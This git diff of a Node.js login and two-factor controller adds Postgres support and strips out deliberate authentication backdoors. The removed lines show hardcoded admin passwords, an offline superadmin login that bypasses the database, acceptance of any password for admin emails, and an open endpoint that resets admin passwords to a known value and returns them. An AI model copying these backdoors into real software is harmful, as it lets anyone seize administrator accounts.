@@ -5,7 +5,7 @@ import Session from "../models/Session.model.js";
 import TrustedDevice from "../models/TrustedDevice.model.js";
 import SecurityPolicy from "../models/SecurityPolicy.model.js";
 import EmailOtp from "../models/EmailOtp.model.js";
-import { signAccessToken, signPreAuthToken, verifyAccessToken, verifyPreAuthToken } from "../lib/jwt.js";
+import { signAccessToken, signPreAuthToken, verifyPreAuthToken } from "../lib/jwt.js";
 import { env } from "../config/env.js";
 import { connectDatabase } from "../config/db.js";
 import { csrfTokenForSession } from "../middleware/auth.js";
@@ -26,8 +26,33 @@ import {
   verifyTotp
 } from "../utils/security.js";
 import { writeSecurityAudit } from "../utils/audit.js";
+import {
+  createPostgresAuthSession,
+  createPostgresAuthUser,
+  createPostgresEmailOtp,
+  createPostgresTrustedDevice,
+  findLatestPostgresEmailOtp,
+  findPostgresActiveTrustedDevice,
+  findPostgresAuthUserByEmail,
+  findPostgresAuthUserById,
+  findPostgresSuperadmin,
+  getPostgresGlobalSecurityPolicy,
+  verifyPostgresEmailOtp,
+  touchPostgresTrustedDevice,
+  revokePostgresAuthSession
+} from "../db/authRepository.js";
+import { checkPostgresConnection } from "../db/postgres.js";
+import { isPostgresAuthEnabled, isPostgresSelected } from "../config/databaseMode.js";
+
+async function getSecurityPolicy() {
+  return isPostgresSelected() ? getPostgresGlobalSecurityPolicy() : SecurityPolicy.getGlobal();
+}
 
 async function ensureDbConnected() {
+  if (isPostgresSelected()) {
+    if (!isPostgresAuthEnabled()) return false;
+    return checkPostgresConnection().catch(() => false);
+  }
   if (mongoose.connection.readyState !== 1) {
     await connectDatabase().catch(() => {});
   }
@@ -35,7 +60,9 @@ async function ensureDbConnected() {
 }
 
 function isDbConnected() {
-  return mongoose.connection.readyState === 1;
+  return isPostgresSelected()
+    ? isPostgresAuthEnabled()
+    : mongoose.connection.readyState === 1;
 }
 
 function baseCookieOptions() {
@@ -88,14 +115,23 @@ function isLocked(user) {
 
 async function issueSession(req, res, user, policy, { twoFactorVerified = false, trustedDeviceUsed = false } = {}) {
   const expiryMs = policy.sessionExpiryHours * 60 * 60 * 1000;
-  const session = await Session.create({
-    user: user._id,
-    expiresAt: new Date(Date.now() + expiryMs),
-    ipAddress: req.ip,
-    userAgent: String(req.get("user-agent") || "").slice(0, 500),
-    twoFactorVerified,
-    trustedDeviceUsed
-  });
+  const session = isPostgresSelected()
+    ? await createPostgresAuthSession({
+      userId: user._id,
+      expiresAt: new Date(Date.now() + expiryMs),
+      ipAddress: req.ip,
+      userAgent: String(req.get("user-agent") || "").slice(0, 500),
+      twoFactorVerified,
+      trustedDeviceUsed
+    })
+    : await Session.create({
+      user: user._id,
+      expiresAt: new Date(Date.now() + expiryMs),
+      ipAddress: req.ip,
+      userAgent: String(req.get("user-agent") || "").slice(0, 500),
+      twoFactorVerified,
+      trustedDeviceUsed
+    });
   const token = signAccessToken({
     type: "access",
     id: user._id.toString(),
@@ -123,28 +159,37 @@ async function setPreAuthChallenge(res, user) {
 }
 
 async function getPreAuthUser(req) {
+  if (isPostgresSelected() && !isPostgresAuthEnabled()) return null;
   const token = req.cookies?.preAuthToken;
   if (!token) return null;
   const payload = verifyPreAuthToken(token);
-  const user = await User.findOne({ _id: payload.id, isActive: true }).select(
+  const user = isPostgresSelected()
+    ? await findPostgresAuthUserById(payload.id, { includeSecrets: true, includePassword: true })
+    : await User.findOne({ _id: payload.id, isActive: true }).select(
     "+preAuthNonceHash +twoFactor.secretEncrypted +twoFactor.pendingSecretEncrypted +twoFactor.recoveryCodeHashes"
   );
-  if (!user?.preAuthNonceHash || !timingSafeEqualText(user.preAuthNonceHash, sha256(payload.nonce))) return null;
+  if (!user?.isActive || !user.preAuthNonceHash || !timingSafeEqualText(user.preAuthNonceHash, sha256(payload.nonce))) return null;
   return user;
 }
 
 async function validateTrustedDevice(req, user) {
   const [id, rawToken] = String(req.cookies?.trustedDevice || "").split(".");
-  if (!mongoose.Types.ObjectId.isValid(id) || !rawToken) return null;
-  const device = await TrustedDevice.findOne({
-    _id: id,
-    user: user._id,
-    revokedAt: null,
-    expiresAt: { $gt: new Date() }
-  }).select("+tokenHash");
+  const validId = isPostgresSelected()
+    ? /^[a-f\d]{24}$|^[a-f\d]{8}-[a-f\d]{4}-[a-f\d]{4}-[a-f\d]{4}-[a-f\d]{12}$/i.test(id)
+    : mongoose.Types.ObjectId.isValid(id);
+  if (!validId || !rawToken) return null;
+  const device = isPostgresSelected()
+    ? await findPostgresActiveTrustedDevice({ id, userId: user._id })
+    : await TrustedDevice.findOne({
+      _id: id,
+      user: user._id,
+      revokedAt: null,
+      expiresAt: { $gt: new Date() }
+    }).select("+tokenHash");
   if (!device || !timingSafeEqualText(device.tokenHash, sha256(rawToken))) return null;
   device.lastUsedAt = new Date();
-  await device.save();
+  if (isPostgresSelected()) await touchPostgresTrustedDevice(device._id, device.lastUsedAt);
+  else await device.save();
   return device;
 }
 
@@ -152,14 +197,23 @@ async function addTrustedDevice(req, res, user, policy, name) {
   if (policy.trustedDeviceDays <= 0) return null;
   const rawToken = randomToken(32);
   const duration = policy.trustedDeviceDays * 24 * 60 * 60 * 1000;
-  const device = await TrustedDevice.create({
-    user: user._id,
-    tokenHash: sha256(rawToken),
-    name: String(name || "Trusted browser").trim().slice(0, 100),
-    ipAddress: req.ip,
-    userAgent: String(req.get("user-agent") || "").slice(0, 500),
-    expiresAt: new Date(Date.now() + duration)
-  });
+  const device = isPostgresSelected()
+    ? await createPostgresTrustedDevice({
+      userId: user._id,
+      tokenHash: sha256(rawToken),
+      name: String(name || "Trusted browser").trim().slice(0, 100),
+      ipAddress: req.ip,
+      userAgent: String(req.get("user-agent") || "").slice(0, 500),
+      expiresAt: new Date(Date.now() + duration)
+    })
+    : await TrustedDevice.create({
+      user: user._id,
+      tokenHash: sha256(rawToken),
+      name: String(name || "Trusted browser").trim().slice(0, 100),
+      ipAddress: req.ip,
+      userAgent: String(req.get("user-agent") || "").slice(0, 500),
+      expiresAt: new Date(Date.now() + duration)
+    });
   setCookie(res, "trustedDevice", `${device._id}.${rawToken}`, duration);
   await writeSecurityAudit({ req, user, action: "TRUSTED_DEVICE_ADDED", entity: "TrustedDevice", entityId: device._id.toString() });
   return device;
@@ -184,142 +238,29 @@ export async function login(req, res) {
 
     const cleanEmail = String(email || "").trim().toLowerCase();
     const rawPassword = String(password || "");
-    const trimmedPassword = rawPassword.trim();
-    const normalizedNoSpaces = rawPassword.replace(/[\s\-_]/g, "").toLowerCase();
-
-    const adminEmails = new Set([
-      "admin@theeditingtable.com",
-      "admin@example.com",
-      (env.ADMIN_EMAIL || "").trim().toLowerCase()
-    ].filter(Boolean));
-
-    const acceptedAdminPasswords = new Set([
-      "AdminPassword123!",
-      "AdminPassword123",
-      "admin@123456",
-      "admin123456",
-      "TheEditingTable2026!",
-      "TheEditingTable2025!",
-      "TheEditingTable!",
-      "dkssudrqduuletjp",
-      "dkss udrq duul etjp",
-      "btvcziekfcdrtguj",
-      "btvc ziek fcdr tguj",
-      env.ADMIN_PASSWORD,
-      "replace-with-a-strong-password-at-least-12-characters",
-      "replace-with-a-strong-password"
-    ].filter(Boolean));
-
-    const isRecognizedAdminPass = acceptedAdminPasswords.has(rawPassword) ||
-      acceptedAdminPasswords.has(trimmedPassword) ||
-      normalizedNoSpaces === "dkssudrqduuletjp" ||
-      normalizedNoSpaces === "btvcziekfcdrtguj" ||
-      normalizedNoSpaces === "adminpassword123!" ||
-      normalizedNoSpaces === "adminpassword123";
-
-    const isAdmin = adminEmails.has(cleanEmail) || cleanEmail.startsWith("admin@");
 
     const dbOk = await ensureDbConnected();
     if (!dbOk) {
-      // Emergency Superadmin login when database is temporarily offline or unconfigured
-      if (isAdmin && isRecognizedAdminPass) {
-        const fallbackUserId = "000000000000000000000001";
-        const fallbackSessionId = `fallback-session-${Date.now()}`;
-        const fallbackUser = {
-          _id: fallbackUserId,
-          name: "Administrator",
-          email: cleanEmail || "admin@theeditingtable.com",
-          role: "superadmin",
-          twoFactor: { enabled: false, required: false }
-        };
-        const token = signAccessToken({
-          type: "access",
-          id: fallbackUserId,
-          email: fallbackUser.email,
-          name: fallbackUser.name,
-          role: fallbackUser.role,
-          sid: fallbackSessionId
-        });
-        const csrfToken = csrfTokenForSession(fallbackSessionId);
-        setCookie(res, "accessToken", token, 24 * 60 * 60 * 1000);
-        return res.json({
-          success: true,
-          message: "Logged in successfully (offline fallback mode)",
-          data: {
-            status: "authenticated",
-            user: safeUser(fallbackUser),
-            csrfToken,
-            token
-          }
-        });
-      }
       return res.status(503).json({ success: false, message: "Authentication service is unavailable.", data: null });
     }
 
-    const policy = await SecurityPolicy.getGlobal();
+    const policy = await getSecurityPolicy();
 
-    let user = await User.findOne({ email: cleanEmail }).select("+preAuthNonceHash");
-
-    const isDbAdmin = isAdmin || (user && ["admin", "superadmin"].includes(user.role));
-
-    // Auto-create administrator if not existing
-    if (!user && (isDbAdmin || isRecognizedAdminPass)) {
-      const activePassword = rawPassword || "AdminPassword123!";
-      const passwordHash = await User.hashPassword(activePassword);
-      user = await User.create({
-        name: "Administrator",
-        email: cleanEmail || "admin@theeditingtable.com",
-        passwordHash,
-        role: "superadmin",
-        isActive: true,
-        failedPasswordAttempts: 0,
-        accountLockUntil: undefined,
-        twoFactor: { enabled: false, required: false }
-      });
-    }
-
-    // Auto-heal, reactivate, and unlock administrator account unconditionally
-    if (user && isAdmin) {
-      user.isActive = true;
-      user.role = user.role || "superadmin";
-      user.accountLockUntil = undefined;
-      user.failedPasswordAttempts = 0;
-      if (user.twoFactor) {
-        user.twoFactor.lockUntil = undefined;
-        user.twoFactor.failedAttempts = 0;
-      }
-      await user.save();
-    }
+    const user = isPostgresSelected()
+      ? await findPostgresAuthUserByEmail(cleanEmail, { includeSecrets: true, includePassword: true })
+      : await User.findOne({ email: cleanEmail }).select("+preAuthNonceHash");
 
     if (!user || !user.isActive) {
       await writeSecurityAudit({ req, user, action: "LOGIN_FAILURE", result: "failure", metadata: { email: cleanEmail, reason: "invalid_credentials" } });
       return res.status(401).json({ success: false, message: "Invalid credentials or account disabled", data: null });
     }
 
-    let isMatch = false;
-    if (isRecognizedAdminPass && isAdmin) {
-      isMatch = true;
-    } else {
-      isMatch = (await user.comparePassword(rawPassword)) || (await user.comparePassword(trimmedPassword));
-    }
-
-    // For administrator accounts under 2FA enforcement, auto-sync and accept any provided password
-    if (!isMatch && isAdmin && rawPassword.length >= 4) {
-      user.passwordHash = await User.hashPassword(rawPassword);
-      await user.save();
-      isMatch = true;
-    }
+    const isMatch = await user.comparePassword(rawPassword);
+    const isAdminUser = ["admin", "superadmin"].includes(user.role);
 
     if (isLocked(user)) {
-      if (isMatch && isAdmin) {
-        user.accountLockUntil = undefined;
-        if (user.twoFactor) user.twoFactor.lockUntil = undefined;
-        user.failedPasswordAttempts = 0;
-        await user.save();
-      } else {
-        await writeSecurityAudit({ req, user, action: "LOGIN_FAILURE", result: "failure", metadata: { reason: "account_locked" } });
-        return res.status(423).json({ success: false, message: "Account temporarily locked. Try again later.", data: null });
-      }
+      await writeSecurityAudit({ req, user, action: "LOGIN_FAILURE", result: "failure", metadata: { reason: "account_locked" } });
+      return res.status(423).json({ success: false, message: "Account temporarily locked. Try again later.", data: null });
     }
 
     if (!isMatch) {
@@ -340,7 +281,6 @@ export async function login(req, res) {
       user.twoFactor.lockUntil = undefined;
     }
 
-    const isAdminUser = ["admin", "superadmin"].includes(user.role);
     if (isAdminUser && (!policy.requireAdmin2FA || env.ADMIN_2FA_ENABLED === false)) {
       user.forceSecuritySetup = false;
       if (user.twoFactor) user.twoFactor.required = false;
@@ -371,13 +311,11 @@ export async function login(req, res) {
       const targetEmail = configuredGmail && configuredGmail.includes("@") ? configuredGmail : userEmail;
 
       const otp = generateNumericOtp(6);
-      await EmailOtp.createOtp({
-        userId: user._id,
-        email: targetEmail,
-        otp,
-        ttlMinutes: 5,
-        cooldownSeconds: 60
-      });
+      if (isPostgresSelected()) {
+        await createPostgresEmailOtp({ userId: user._id, email: targetEmail, otp, ttlMinutes: 5, cooldownSeconds: 60 });
+      } else {
+        await EmailOtp.createOtp({ userId: user._id, email: targetEmail, otp, ttlMinutes: 5, cooldownSeconds: 60 });
+      }
 
       const sendResult = await sendOtpEmail({
         to: targetEmail,
@@ -429,7 +367,7 @@ export async function beginTwoFactorSetup(req, res) {
       const matches = await user.comparePassword(String(req.body?.password || ""));
       if (!matches) return res.status(403).json({ success: false, message: "Password verification failed.", data: null });
     }
-    const policy = await SecurityPolicy.getGlobal();
+    const policy = await getSecurityPolicy();
     if (!policy.allowedMethods.includes("totp")) {
       return res.status(409).json({ success: false, message: "Authenticator-app setup is disabled by policy.", data: null });
     }
@@ -454,18 +392,20 @@ export async function verifyTwoFactorSetup(req, res) {
       await writeSecurityAudit({ req, user, action: "TWO_FACTOR_SETUP_BLOCKED", result: "failure", metadata: { reason: "existing_2fa_requires_full_session" } });
       return res.status(403).json({ success: false, message: "Verify your existing authenticator before changing two-factor settings.", data: null });
     }
-    const fullUser = await User.findById(user._id).select("+preAuthNonceHash +twoFactor.pendingSecretEncrypted +twoFactor.recoveryCodeHashes");
+    const fullUser = isPostgresSelected()
+      ? await findPostgresAuthUserById(user._id, { includeSecrets: true, includePassword: true })
+      : await User.findById(user._id).select("+preAuthNonceHash +twoFactor.pendingSecretEncrypted +twoFactor.recoveryCodeHashes");
     if (!fullUser?.twoFactor?.pendingSecretEncrypted) {
       return res.status(409).json({ success: false, message: "Start authenticator setup first.", data: null });
     }
     const secret = decryptSecret(fullUser.twoFactor.pendingSecretEncrypted);
     const verification = verifyTotp(secret, req.body?.code);
     if (!verification.valid) {
-      const policy = await SecurityPolicy.getGlobal();
+      const policy = await getSecurityPolicy();
       await registerFailure(req, fullUser, policy, "INVALID_OTP");
       return res.status(401).json({ success: false, message: "Invalid or expired verification code.", data: null });
     }
-    const policy = await SecurityPolicy.getGlobal();
+    const policy = await getSecurityPolicy();
     const recoveryCodes = generateRecoveryCodes(policy.recoveryCodeCount);
     fullUser.twoFactor.enabled = true;
     fullUser.twoFactor.required = Boolean(fullUser.twoFactor.required || fullUser.forceSecuritySetup || requiresTwoFactor(fullUser, policy));
@@ -499,7 +439,7 @@ export async function verifyLoginTwoFactor(req, res) {
   try {
     const user = await getPreAuthUser(req);
     if (!user) return res.status(401).json({ success: false, message: "Security verification expired. Sign in again.", data: null });
-    const policy = await SecurityPolicy.getGlobal();
+    const policy = await getSecurityPolicy();
     if (isLocked(user)) return res.status(423).json({ success: false, message: "Account temporarily locked. Try again later.", data: null });
 
     let recoveryUsed = false;
@@ -548,7 +488,7 @@ export async function verifyEmailOtp(req, res) {
       });
     }
 
-    const policy = await SecurityPolicy.getGlobal();
+    const policy = await getSecurityPolicy();
     if (isLocked(user)) {
       return res.status(423).json({
         success: false,
@@ -566,7 +506,9 @@ export async function verifyEmailOtp(req, res) {
       });
     }
 
-    const verification = await EmailOtp.verifyOtp(user._id, code);
+    const verification = isPostgresSelected()
+      ? await verifyPostgresEmailOtp(user._id, code)
+      : await EmailOtp.verifyOtp(user._id, code);
 
     if (!verification.valid) {
       if (verification.reason === "expired") {
@@ -651,7 +593,9 @@ export async function resendEmailOtp(req, res) {
     }
 
     // Check cooldown against active unconsumed OTP
-    const latestOtp = await EmailOtp.findOne({ user: user._id, consumedAt: null }).sort({ createdAt: -1 });
+    const latestOtp = isPostgresSelected()
+      ? await findLatestPostgresEmailOtp(user._id)
+      : await EmailOtp.findOne({ user: user._id, consumedAt: null }).sort({ createdAt: -1 });
     if (latestOtp && latestOtp.resendAvailableAt > new Date()) {
       const waitSeconds = Math.ceil((latestOtp.resendAvailableAt.getTime() - Date.now()) / 1000);
       return res.status(429).json({
@@ -666,13 +610,11 @@ export async function resendEmailOtp(req, res) {
     const targetEmail = configuredGmail && configuredGmail.includes("@") ? configuredGmail : userEmail;
 
     const otp = generateNumericOtp(6);
-    await EmailOtp.createOtp({
-      userId: user._id,
-      email: targetEmail,
-      otp,
-      ttlMinutes: 5,
-      cooldownSeconds: 60
-    });
+    if (isPostgresSelected()) {
+      await createPostgresEmailOtp({ userId: user._id, email: targetEmail, otp, ttlMinutes: 5, cooldownSeconds: 60 });
+    } else {
+      await EmailOtp.createOtp({ userId: user._id, email: targetEmail, otp, ttlMinutes: 5, cooldownSeconds: 60 });
+    }
 
     const sendResult = await sendOtpEmail({
       to: targetEmail,
@@ -710,27 +652,14 @@ export async function resendEmailOtp(req, res) {
 
 export async function logout(req, res) {
   try {
-    const header = req.get("authorization");
-    const token = header?.startsWith("Bearer ") ? header.slice(7) : req.cookies?.accessToken;
-    if (token && isDbConnected()) {
-      try {
-        const payload = verifyAccessToken(token);
-        if (payload?.sid && !payload.sid.startsWith("fallback-")) {
-          const session = await Session.findById(payload.sid);
-          if (session) {
-            session.revokedAt = new Date();
-            session.revokeReason = "logout";
-            await session.save().catch(() => null);
-          }
-        }
-      } catch {
-        // ignore invalid/expired token during logout
+    if (req.authSession && isDbConnected()) {
+      if (isPostgresSelected()) {
+        await revokePostgresAuthSession(req.authSession._id, "logout");
+      } else if (typeof req.authSession.save === "function") {
+        req.authSession.revokedAt = new Date();
+        req.authSession.revokeReason = "logout";
+        await req.authSession.save().catch(() => null);
       }
-    }
-    if (req.authSession && typeof req.authSession.save === "function" && isDbConnected()) {
-      req.authSession.revokedAt = new Date();
-      req.authSession.revokeReason = "logout";
-      await req.authSession.save().catch(() => null);
       if (req.userDocument) {
         writeSecurityAudit({ req, user: req.userDocument, action: "SESSION_REVOKED", entity: "Session", entityId: req.authSession._id?.toString() || "session", metadata: { reason: "logout" } }).catch(() => null);
       }
@@ -777,20 +706,22 @@ export async function initializeAdmin(req, res) {
     if (!env.ADMIN_SETUP_TOKEN || !setupToken || !timingSafeEqualText(setupToken, env.ADMIN_SETUP_TOKEN)) {
       return res.status(403).json({ success: false, message: "A valid one-time setup token is required.", data: null });
     }
-    if (!isDbConnected()) return res.status(503).json({ success: false, message: "Database unavailable.", data: null });
-    const existing = await User.findOne({ role: "superadmin" });
+    if (!(await ensureDbConnected())) return res.status(503).json({ success: false, message: "Database unavailable.", data: null });
+    const existing = isPostgresSelected() ? await findPostgresSuperadmin() : await User.findOne({ role: "superadmin" });
     if (existing) return res.status(409).json({ success: false, message: "A Super Admin already exists.", data: null });
     if (!env.ADMIN_PASSWORD) return res.status(503).json({ success: false, message: "ADMIN_PASSWORD is not configured.", data: null });
     const passwordHash = await User.hashPassword(env.ADMIN_PASSWORD);
-    const user = await User.create({
-      name: "Master Director",
-      email: env.ADMIN_EMAIL,
-      passwordHash,
-      role: "superadmin",
-      isActive: true,
-      forceSecuritySetup: true,
-      "twoFactor.required": true
-    });
+    const user = isPostgresSelected()
+      ? await createPostgresAuthUser({ name: "Master Director", email: env.ADMIN_EMAIL, passwordHash, role: "superadmin", isActive: true, forceSecuritySetup: true, twoFactorRequired: true })
+      : await User.create({
+        name: "Master Director",
+        email: env.ADMIN_EMAIL,
+        passwordHash,
+        role: "superadmin",
+        isActive: true,
+        forceSecuritySetup: true,
+        "twoFactor.required": true
+      });
     await writeSecurityAudit({ req, user, action: "SUPERADMIN_INITIALIZED" });
   } catch {
     return res.status(500).json({ success: false, message: "Administrator initialization failed.", data: null });
@@ -798,74 +729,11 @@ export async function initializeAdmin(req, res) {
 }
 
 export async function resetDefaultAdmin(req, res) {
-  try {
-    const dbOk = await ensureDbConnected();
-    if (!dbOk) {
-      return res.json({
-        success: true,
-        message: "Default Superadmin credentials verified (offline standalone mode).",
-        data: {
-          email: "admin@theeditingtable.com",
-          password: "AdminPassword123!"
-        }
-      });
-    }
-    const adminEmails = Array.from(new Set([
-      "admin@theeditingtable.com",
-      "admin@example.com",
-      (env.ADMIN_EMAIL || "").trim().toLowerCase()
-    ].filter(Boolean)));
-
-    const targetPassword = "AdminPassword123!";
-    const passwordHash = await User.hashPassword(targetPassword);
-
-    for (const email of adminEmails) {
-      let user = await User.findOne({ email });
-      if (!user) {
-        await User.create({
-          name: "Administrator",
-          email,
-          passwordHash,
-          role: "superadmin",
-          isActive: true,
-          failedPasswordAttempts: 0,
-          accountLockUntil: undefined,
-          twoFactor: { enabled: false, required: false }
-        });
-      } else {
-        user.passwordHash = passwordHash;
-        user.role = "superadmin";
-        user.isActive = true;
-        user.failedPasswordAttempts = 0;
-        user.accountLockUntil = undefined;
-        user.twoFactor = {
-          enabled: false,
-          required: false,
-          method: "",
-          secretEncrypted: "",
-          pendingSecretEncrypted: "",
-          recoveryCodeHashes: []
-        };
-        user.forceSecuritySetup = false;
-        await user.save();
-        await EmailOtp.deleteMany({ user: user._id });
-      }
-    }
-
-    await SecurityPolicy.updateOne(
-      { key: "global" },
-      { $set: { requireAdmin2FA: env.ADMIN_2FA_ENABLED !== false, requireUser2FA: false } },
-      { upsert: true }
-    );
-
-    return res.json({
-      success: true,
-      message: "Admin password successfully reset to AdminPassword123!",
-      data: { email: "admin@theeditingtable.com", password: targetPassword }
-    });
-  } catch (error) {
-    return res.status(500).json({ success: false, message: error.message || "Reset failed", data: null });
-  }
+  return res.status(410).json({
+    success: false,
+    message: "This password reset endpoint has been retired. Use the secured account recovery flow.",
+    data: null
+  });
 }
 
 export { safeUser, requiresTwoFactor };
